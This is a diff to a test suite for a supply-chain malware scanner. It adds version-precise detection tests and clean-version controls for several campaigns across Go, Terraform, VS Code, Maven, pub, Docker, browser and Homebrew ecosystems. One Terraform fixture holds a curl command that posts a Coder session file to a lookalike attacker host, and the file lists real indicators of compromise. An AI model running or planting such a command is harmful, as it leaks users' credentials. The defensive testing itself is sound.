@@ -7,10 +7,11 @@ import {
   MALICIOUS_PACKAGE_PATTERNS,
   PYPI_TYPOSQUAT_PATTERNS,
 } from "../patterns.js";
-import { matchPackageIOC, getBundledFeed } from "../threat-intel.js";
+import { matchPackageIOC, getBundledFeed, splitPackageIOCValue } from "../threat-intel.js";
 import { matchBareNpmIOC } from "../install-guard.js";
 import { checkPackageName } from "../npm-scanner.js";
 import type { Finding } from "../types.js";
+import { performanceBudget } from "./performance-budget.js";
 
 describe("Campaign Signatures", () => {
   let tempDir: string;
@@ -527,7 +528,7 @@ describe("Campaign Signatures", () => {
         .toBe(true);
     });
 
-    it("bounds whitespace backtracking in the loader rule", () => {
+    it("bounds whitespace backtracking in the loader rule", { timeout: performanceBudget(60_000) }, () => {
       const loader = CAMPAIGN_PATTERNS.find(
         (pattern) => pattern.rule === "MINI_SHAI_HULUD_LOADER",
       )!;
@@ -536,7 +537,7 @@ describe("Campaign Signatures", () => {
       const started = performance.now();
 
       expect(regex.test(probe)).toBe(false);
-      expect(performance.now() - started).toBeLessThan(250);
+      expect(performance.now() - started).toBeLessThan(performanceBudget(250));
     });
 
     it("should detect a bun preinstall hook invoking setup.mjs", async () => {
@@ -2151,7 +2152,42 @@ describe("Campaign Signatures", () => {
       }
     });
 
-    it("should match the malicious Go module paths against the malicious-name patterns", () => {
+    // The Go modules of this wave are INFECTED developer repositories. They were
+    // name-blocked until 2026-09-23, which flagged every version, including a
+    // framework (lambda-platform/lambda) whose 137 retrievable proxy versions are
+    // all clean. Only the pseudo-versions whose Go proxy zip carries the loader
+    // are indicators now.
+    const INFECTED_GO = [
+      ["github.com/glacialspring/go-winsparkle", "v0.0.0-20250402002608-9d703488711b"],
+      ["github.com/glacialspring/static", "v0.0.0-20181015024211-023dc73bc332"],
+      ["github.com/zainirfan13/graphql-client", "v0.0.0-20220912215956-d304e79da123"],
+      ["github.com/dexbotsdev/uniswap-v2-v3-arbitrage", "v0.0.0-20231007040513-b492291579de"],
+    ] as const;
+
+    const goScan = async (mod: string, ver: string) => {
+      fs.writeFileSync(
+        path.join(tempDir, "go.mod"),
+        `module example.com/consumer\n\ngo 1.22\n\nrequire ${mod} ${ver}\n`,
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      return report.findings.filter((f) => f.rule === "GO_MALICIOUS_MODULE");
+    };
+
+    it.each(INFECTED_GO)("flags the infected pseudo-version %s@%s", async (mod, ver) => {
+      const hits = await goScan(mod, ver);
+      expect(hits, `${mod}@${ver} carries the loader and must be flagged`).toHaveLength(1);
+      expect(hits[0]?.severity).toBe("critical");
+    });
+
+    it.each(INFECTED_GO)("does NOT flag another version of %s", async (mod) => {
+      expect(await goScan(mod, "v0.0.0-20260901000000-0123456789ab")).toEqual([]);
+    });
+
+    it("does NOT flag lambda-platform/lambda, whose retrievable versions are all clean", async () => {
+      expect(await goScan("github.com/lambda-platform/lambda", "v0.9.19")).toEqual([]);
+    });
+
+    it("carries no Go path of this wave as a name pattern", () => {
       for (const mod of [
         "github.com/lambda-platform/lambda",
         "github.com/lambda-platform/ebarimt-rest-api",
@@ -2161,15 +2197,18 @@ describe("Campaign Signatures", () => {
         "github.com/glacialspring/static",
         "github.com/bm-197/chill",
         "github.com/naol7/dist-task-scheduler",
+        "github.com/anatoli-derese/a2sv-excercise",
         "github.com/dexbotsdev/uniswap-v2-v3-arbitrage",
+        "github.com/zainirfan13/graphql-client",
+        "github.com/hngi/team-fierce-backend-golang",
         "github.com/rickt/slack-weather-bot",
         "github.com/Barsu5489/commerce",
         "github.com/Setsu548/Logistic",
       ]) {
-        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
-          new RegExp(pattern).test(mod),
-        );
-        expect(matches).toBe(true);
+        expect(
+          MALICIOUS_PACKAGE_PATTERNS.filter((pattern) => new RegExp(pattern).test(mod)),
+          `${mod} is an infected victim repository; a name pattern blocks every version`,
+        ).toEqual([]);
       }
     });
 
@@ -2291,22 +2330,74 @@ describe("Campaign Signatures", () => {
   });
 
   // =================================================================
+  // Coder registry compromise (GHSA-vx42-ghc9-gw65, 2026-08-31)
+  // =================================================================
+
+  describe("Coder registry compromise (August 2026)", () => {
+    // Tampered modules served by Coder's own registry sent credentials to a
+    // lookalike host; the advisory names no module or version, so the host is
+    // the indicator. Built from parts so this file carries no raw IOC string.
+    const HOST = ["coder", "infra"].join("-") + ".com";
+
+    it.each([HOST, `www.${HOST}`])("flags a tampered module calling %s", async (host) => {
+      fs.writeFileSync(
+        path.join(tempDir, "main.tf"),
+        `data "external" "telemetry" {\n  program = ["sh", "-c", "curl -s https://${host}/c -d @$HOME/.config/coderv2/session"]\n}\n`,
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      // Feed-carried domains report as THREAT_INTEL_MATCH (IOC_KNOWN_C2_DOMAIN is the
+      // hardcoded list in ioc-blocklist.ts).
+      const finding = report.findings.find((f) => f.rule === "THREAT_INTEL_MATCH");
+      expect(finding, `${host} must be flagged`).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("does NOT flag Coder's real registry host", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "main.tf"),
+        'module "code-server" {\n  source = "registry.coder.com/coder/code-server/coder"\n}\n',
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.filter((f) => f.rule === "THREAT_INTEL_MATCH" || f.rule === "IOC_KNOWN_C2_DOMAIN")).toEqual([]);
+    });
+  });
+
+  // =================================================================
   // PolinRider DPRK supply-chain campaign (Socket / THN, July 6, 2026)
   // =================================================================
 
   describe("PolinRider DPRK Supply Chain (July 2026)", () => {
-    it("should flag the compromised Xpos587 GitHub account reference", async () => {
+    // Xpos587 is the COMPROMISED account of a live project (git2md). Until
+    // 2026-09-23 the account was a malicious-account entry and the module a bare
+    // name, which flagged every reference to a real developer. The indicator is
+    // the one pseudo-version whose Go proxy zip carries the loader.
+    const GIT2MD = "github.com/Xpos587/git2md";
+    const INFECTED = "v0.0.0-20260503100027-79bdb26ca95d";
+
+    const goModScan = async (ver: string) => {
+      fs.writeFileSync(
+        path.join(tempDir, "go.mod"),
+        `module example.com/consumer\n\ngo 1.22\n\nrequire ${GIT2MD} ${ver}\n`,
+      );
+      return (await scan({ target: tempDir, format: "text" })).findings;
+    };
+
+    it("flags the infected git2md pseudo-version", async () => {
+      const hits = (await goModScan(INFECTED)).filter((f) => f.rule === "GO_MALICIOUS_MODULE");
+      expect(hits).toHaveLength(1);
+      expect(hits[0]?.severity).toBe("critical");
+    });
+
+    it("does NOT flag another git2md version or the account itself", async () => {
+      // The account check reads source references, so import the module the way
+      // a consumer does; go.mod alone would leave that check untested.
       fs.writeFileSync(
         path.join(tempDir, "deps.go"),
-        'package main\nimport _ "github.com/Xpos587/git2md"'
+        `package main\nimport _ "${GIT2MD}"\n`,
       );
-
-      const report = await scan({ target: tempDir, format: "text" });
-      const finding = report.findings.find(
-        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
-      );
-      expect(finding).toBeDefined();
-      expect(finding?.severity).toBe("critical");
+      const findings = await goModScan("v0.0.0-20260901000000-0123456789ab");
+      expect(findings.filter((f) => f.rule === "GO_MALICIOUS_MODULE")).toEqual([]);
+      expect(findings.filter((f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT")).toEqual([]);
     });
   });
 
@@ -6830,15 +6921,379 @@ describe("Campaign Signatures", () => {
       expect(hits, "kreuzwerker and hooks.slack.com are legitimate").toEqual([]);
     });
 
+    it("should flag the kreuzwenker/docker typosquat provider in a .tf file", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "versions.tf"),
+        [
+          "terraform {",
+          "  required_providers {",
+          "    docker = {",
+          '      source  = "kreuzwenker/docker"',
+          '      version = "~> 3.0"',
+          "    }",
+          "  }",
+          "}",
+        ].join("\n")
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "TERRAFORM_MALICIOUS_PROVIDER"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+      expect(finding?.line).toBe(4);
+    });
+
+    it("should flag the gocommunity-io/dockerd provider in the lock file", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, ".terraform.lock.hcl"),
+        [
+          'provider "registry.terraform.io/gocommunity-io/dockerd" {',
+          '  version = "1.0.0"',
+          "}",
+        ].join("\n")
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "TERRAFORM_MALICIOUS_PROVIDER"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.match).toBe("gocommunity-io/dockerd@1.0.0");
+    });
+
+    // The control: the typosquat only works because kreuzwerker/docker is one
+    // of the most-used providers there is, so flagging it would be fatal.
+    it("leaves the legitimate kreuzwerker/docker provider alone", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "versions.tf"),
+        'terraform { required_providers { docker = { source = "kreuzwerker/docker" } } }'
+      );
+      fs.writeFileSync(
+        path.join(tempDir, ".terraform.lock.hcl"),
+        'provider "registry.terraform.io/kreuzwerker/docker" {\n  version = "3.0.2"\n}'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const hits = report.findings.filter(
+        (f) => f.rule === "TERRAFORM_MALICIOUS_PROVIDER"
+      );
+      expect(hits, "kreuzwerker/docker is the legitimate provider").toEqual([]);
+    });
+
     it("keeps every Graphalgo indicator in the bundle", () => {
       const feed = getBundledFeed();
       const set = feed.filter(
         (i) => i.campaign === "Graphalgo Terraform providers and Go modules",
       );
-      expect(set.length, "all 9 Graphalgo feed indicators must be bundled").toBe(9);
+      expect(set.length, "all 11 Graphalgo feed indicators must be bundled").toBe(11);
       for (const ioc of set) {
         expect(ioc.family, `${ioc.value} must carry a family`).toBe("Graphalgo");
       }
+    });
+  });
+
+  // =================================================================
+  // Nx Console nrwl.angular-console 18.95.0 extension identity (May 2026)
+  // =================================================================
+
+  describe("Nx Console 18.95.0 extension identity", () => {
+    it("flags a devcontainer that installs the hijacked 18.95.0 release", async () => {
+      fs.mkdirSync(path.join(tempDir, ".devcontainer"), { recursive: true });
+      fs.writeFileSync(
+        path.join(tempDir, ".devcontainer", "devcontainer.json"),
+        [
+          "{",
+          "  // JSONC, as VS Code writes it",
+          '  "customizations": { "vscode": { "extensions": ["nrwl.angular-console@18.95.0",] } }',
+          "}",
+        ].join("\n")
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find((f) => f.rule === "VSCODE_MALICIOUS_EXTENSION");
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+      expect(finding?.match).toBe("nrwl.angular-console@18.95.0");
+    });
+
+    it("flags an installed copy of the hijacked release", async () => {
+      const installed = path.join(tempDir, "nrwl.angular-console-18.95.0");
+      fs.mkdirSync(installed, { recursive: true });
+      fs.writeFileSync(
+        path.join(installed, "package.json"),
+        JSON.stringify({ name: "angular-console", publisher: "nrwl", version: "18.95.0", engines: { vscode: "^1.90.0" } })
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.some((f) => f.rule === "VSCODE_MALICIOUS_EXTENSION")).toBe(true);
+    });
+
+    // The control: Nx Console is a legitimate extension with millions of
+    // installs. A recommendation (no version) and any other release are clean.
+    it("leaves a recommendation and a clean release of Nx Console alone", async () => {
+      fs.mkdirSync(path.join(tempDir, ".vscode"), { recursive: true });
+      fs.writeFileSync(
+        path.join(tempDir, ".vscode", "extensions.json"),
+        JSON.stringify({ recommendations: ["nrwl.angular-console"] })
+      );
+      fs.writeFileSync(
+        path.join(tempDir, ".devcontainer.json"),
+        JSON.stringify({ customizations: { vscode: { extensions: ["nrwl.angular-console@18.96.0"] } } })
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const hits = report.findings.filter(
+        (f) => f.rule === "VSCODE_MALICIOUS_EXTENSION" || f.rule === "MALICIOUS_DEPENDENCY"
+      );
+      expect(hits, "only the 18.95.0 release of Nx Console is malicious").toEqual([]);
+    });
+
+    it("keeps both registry pins in the bundle", () => {
+      const values = getBundledFeed()
+        .filter((i) => i.campaign === "Nx Console 18.95.0" && i.type === "package")
+        .map((i) => i.value)
+        .sort();
+      expect(values).toEqual([
+        "openvsx:nrwl.angular-console@18.95.0",
+        "vscode:nrwl.angular-console@18.95.0",
+      ]);
+    });
+  });
+
+  // =================================================================
+  // Shai-Hulud 2.0 via the mvnpm Maven mirror (November 2025)
+  // =================================================================
+
+  describe("Shai-Hulud 2.0 mvnpm mirror (Maven)", () => {
+    it("flags the mirrored worm release declared in a pom.xml", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "pom.xml"),
+        [
+          "<project>",
+          "  <properties><posthog.version>4.18.1</posthog.version></properties>",
+          "  <dependencies>",
+          "    <dependency>",
+          "      <groupId>org.mvnpm</groupId>",
+          "      <artifactId>posthog-node</artifactId>",
+          "      <version>${posthog.version}</version>",
+          "    </dependency>",
+          "  </dependencies>",
+          "</project>",
+        ].join("\n")
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find((f) => f.rule === "MAVEN_MALICIOUS_PACKAGE");
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+      expect(finding?.match).toBe("org.mvnpm:posthog-node@4.18.1");
+    });
+
+    it("flags it in a Gradle lockfile", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "gradle.lockfile"),
+        "org.mvnpm:posthog-node:4.18.1=runtimeClasspath\n"
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.some((f) => f.rule === "MAVEN_MALICIOUS_PACKAGE")).toBe(true);
+    });
+
+    // A version catalog carries a scannable extension (.toml) AND is a Maven
+    // file, so it must still be matched exactly once.
+    it("flags it once in a Gradle version catalog", async () => {
+      fs.mkdirSync(path.join(tempDir, "gradle"), { recursive: true });
+      fs.writeFileSync(
+        path.join(tempDir, "gradle", "libs.versions.toml"),
+        ["[libraries]", 'posthog = "org.mvnpm:posthog-node:4.18.1"'].join("\n")
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.filter((f) => f.rule === "MAVEN_MALICIOUS_PACKAGE")).toHaveLength(1);
+    });
+
+    // The control: mvnpm and posthog-node are legitimate; only the mirrored
+    // worm release is malicious.
+    it("leaves a clean posthog-node release alone", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "gradle.lockfile"),
+        "org.mvnpm:posthog-node:4.18.2=runtimeClasspath\n"
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.filter((f) => f.rule === "MAVEN_MALICIOUS_PACKAGE")).toEqual([]);
+    });
+  });
+
+  // =================================================================
+  // universal_file_viewer XCSSET compromise on pub.dev (September 2026)
+  // =================================================================
+
+  describe("universal_file_viewer XCSSET (pub)", () => {
+    const lock = (version: string) => [
+      "packages:",
+      "  universal_file_viewer:",
+      '    dependency: "direct main"',
+      "    description:",
+      "      name: universal_file_viewer",
+      '      url: "https://pub.dev"',
+      "    source: hosted",
+      `    version: "${version}"`,
+      "sdks:",
+      '  dart: ">=3.0.0 <4.0.0"',
+    ].join("\n");
+
+    it("flags a retracted release locked in pubspec.lock", async () => {
+      fs.writeFileSync(path.join(tempDir, "pubspec.lock"), lock("0.1.5"));
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find((f) => f.rule === "PUB_MALICIOUS_PACKAGE");
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+      expect(finding?.match).toBe("universal_file_viewer@0.1.5");
+    });
+
+    it("flags an exact pin in pubspec.yaml exactly once", async () => {
+      fs.writeFileSync(path.join(tempDir, "pubspec.yaml"), "name: app\ndependencies:\n  universal_file_viewer: 0.1.6\n");
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.filter((f) => f.rule === "PUB_MALICIOUS_PACKAGE")).toHaveLength(1);
+    });
+
+    // The control: the package is legitimate and 0.1.7 is its clean release.
+    it("leaves the clean 0.1.7 release alone", async () => {
+      fs.writeFileSync(path.join(tempDir, "pubspec.lock"), lock("0.1.7"));
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.filter((f) => f.rule === "PUB_MALICIOUS_PACKAGE")).toEqual([]);
+    });
+  });
+
+  // =================================================================
+  // TeamPCP Trivy and Checkmarx KICS container images (2026)
+  // =================================================================
+
+  describe("TeamPCP Trivy / KICS container images", () => {
+    it("flags a Dockerfile built on a deleted malicious Trivy tag", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "Dockerfile"),
+        "FROM aquasec/trivy:0.69.4 AS scanner\nFROM node:22\nCOPY --from=scanner /usr/local/bin/trivy /usr/local/bin/trivy\n"
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find((f) => f.rule === "DOCKER_MALICIOUS_IMAGE");
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+      expect(finding?.line).toBe(1);
+    });
+
+    it("flags a compose service pinned to a malicious KICS digest, once", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "docker-compose.yml"),
+        "services:\n  kics:\n    image: checkmarx/kics@sha256:2588a44890263a8185bd5d9fadb6bc9220b60245dbcbc4da35e1b62a6f8c230d\n"
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.filter((f) => f.rule === "DOCKER_MALICIOUS_IMAGE")).toHaveLength(1);
+    });
+
+    it("flags a workflow step running a malicious image through docker://", async () => {
+      fs.mkdirSync(path.join(tempDir, ".github", "workflows"), { recursive: true });
+      fs.writeFileSync(
+        path.join(tempDir, ".github", "workflows", "scan.yml"),
+        "on: push\njobs:\n  scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker://aquasec/trivy:0.69.5\n"
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.some((f) => f.rule === "DOCKER_MALICIOUS_IMAGE")).toBe(true);
+    });
+
+    // The controls: the clean 0.69.3 and the restored KICS latest are fine.
+    it("leaves clean and restored tags alone", async () => {
+      fs.writeFileSync(path.join(tempDir, "Dockerfile"), "FROM aquasec/trivy:0.69.3\nFROM checkmarx/kics:latest\n");
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.filter((f) => f.rule === "DOCKER_MALICIOUS_IMAGE")).toEqual([]);
+    });
+  });
+
+  // =================================================================
+  // Browser extensions, JetBrains plugins, Homebrew (curated 2026-09-23)
+  // =================================================================
+
+  describe("curated browser / JetBrains / Homebrew indicators", () => {
+    const campaign = (name: string) => getBundledFeed().filter((i) => i.campaign === name);
+
+    it("keeps every curated set in the bundle, at the verified sizes", () => {
+      expect(campaign("Cyberhaven extension compromise wave")).toHaveLength(32);
+      expect(campaign("RedDirection browser hijack")).toHaveLength(18);
+      expect(campaign("ShadyPanda extension campaign")).toHaveLength(156);
+      expect(campaign("Socket 108 Chrome extensions")).toHaveLength(66);
+      expect(campaign("Firefox Offside wallet theft")).toHaveLength(40);
+      expect(campaign("JetBrains fake AI plugins")).toHaveLength(15);
+    });
+
+    // Cyberhaven's extension is a hijack victim: 24.10.4 was malicious, the
+    // fixed 24.10.5 and the live releases are not.
+    it("flags the hijacked Cyberhaven release in an installed profile, not the fixed one", async () => {
+      const install = (v: string) => {
+        const dir = path.join(tempDir, "Default", "Extensions", "pajkjnmeojmbapicmbpliphjmcekeaac", `${v}_0`);
+        fs.mkdirSync(dir, { recursive: true });
+        fs.writeFileSync(path.join(dir, "manifest.json"), JSON.stringify({ manifest_version: 3, name: "Cyberhaven", version: v }));
+      };
+      install("24.10.4");
+      install("24.10.5");
+      const report = await scan({ target: tempDir, format: "text" });
+      const hits = report.findings.filter((f) => f.rule === "BROWSER_MALICIOUS_EXTENSION");
+      expect(hits.map((f) => f.match)).toEqual(["pajkjnmeojmbapicmbpliphjmcekeaac@24.10.4"]);
+    });
+
+    // A Chrome store id and an Edge store id are different extensions.
+    it("keeps the Chrome and Edge namespaces apart", () => {
+      const feed = getBundledFeed();
+      const edgeOnly = campaign("RedDirection browser hijack").filter((i) => i.value.startsWith("edge:"));
+      expect(edgeOnly).toHaveLength(8);
+      for (const e of edgeOnly) {
+        const id = e.value.slice("edge:".length);
+        expect(feed.some((i) => i.value === `chrome:${id}`), id).toBe(false);
+      }
+    });
+
+    // Firefox add-on ids are often email-shaped. Those entries were read as
+    // name@version and could never match (28 of the 40), while the tests only
+    // ever exercised a {GUID} id.
+    it("matches an email-shaped Firefox add-on id from the bundle", async () => {
+      const emailShaped = campaign("Firefox Offside wallet theft")
+        .map((i) => i.value.slice("firefox:".length))
+        .filter((id) => !id.startsWith("{"));
+      expect(emailShaped.length).toBeGreaterThanOrEqual(28);
+      const id = emailShaped[0];
+      fs.mkdirSync(path.join(tempDir, "addon"), { recursive: true });
+      fs.writeFileSync(path.join(tempDir, "addon", "manifest.json"), JSON.stringify({
+        manifest_version: 2, name: "x", version: "1.0.0",
+        browser_specific_settings: { gecko: { id } },
+      }));
+      const report = await scan({ target: tempDir, format: "text" });
+      const hits = report.findings.filter((f) => f.rule === "BROWSER_MALICIOUS_EXTENSION");
+      expect(hits.map((f) => f.match?.split("@1.0.0")[0])).toEqual([id]);
+    });
+
+    it("still reads a version after an email-shaped Firefox id", () => {
+      expect(splitPackageIOCValue("firefox", "a@b.example@1.2.3")).toEqual({ name: "a@b.example", version: "1.2.3" });
+      expect(splitPackageIOCValue("firefox", "a@b.example")).toEqual({ name: "a@b.example", version: undefined });
+      expect(splitPackageIOCValue("npm", "x@b.example")).toEqual({ name: "x", version: "b.example" });
+    });
+
+    it("flags the removed JetBrains plugin required by a project", async () => {
+      fs.mkdirSync(path.join(tempDir, ".idea"), { recursive: true });
+      fs.writeFileSync(path.join(tempDir, ".idea", "externalDependencies.xml"),
+        '<project version="4">\n  <component name="ExternalDependencies">\n    <plugin id="ord.cp.code.ai.kit" />\n  </component>\n</project>\n');
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.some((f) => f.rule === "JETBRAINS_MALICIOUS_PLUGIN")).toBe(true);
+    });
+
+    // Only the compromised tap's 0.69.4; homebrew-core builds trivy from source.
+    it("flags the compromised Trivy tap release only", async () => {
+      const lock = (name: string, v: string) =>
+        JSON.stringify({ entries: { brew: { [name]: { version: v } } } });
+      fs.writeFileSync(path.join(tempDir, "Brewfile.lock.json"), lock("aquasecurity/trivy/trivy", "0.69.4"));
+      const hit = await scan({ target: tempDir, format: "text" });
+      expect(hit.findings.some((f) => f.rule === "HOMEBREW_MALICIOUS_PACKAGE")).toBe(true);
+      fs.writeFileSync(path.join(tempDir, "Brewfile.lock.json"), lock("trivy", "0.69.4"));
+      const core = await scan({ target: tempDir, format: "text" });
+      expect(core.findings.filter((f) => f.rule === "HOMEBREW_MALICIOUS_PACKAGE")).toEqual([]);
     });
   });
 
